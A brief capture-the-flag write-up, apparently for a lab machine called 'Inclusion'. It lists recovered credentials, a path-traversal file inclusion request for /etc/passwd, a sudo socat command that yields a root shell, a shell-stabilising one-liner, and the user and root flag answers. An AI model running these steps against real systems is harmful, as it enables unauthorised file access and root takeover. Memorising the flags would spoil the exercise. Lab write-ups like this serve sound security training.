# Inclusion

## Credentials
`falconfeast:rootpassword`

## Vulnerabilities

### Local File Inclusion
- `/article?name=../../../../etc/passwd` 
- `#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false` found as comment in /etc/passwd

## Privilege Escalation

### Sudo
- `sudo socat stdin exec:/bin/sh` got root access
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` shell stabilisation

### Answers
1. user flag
60989655118397345799

2. root flag
42964104845495153909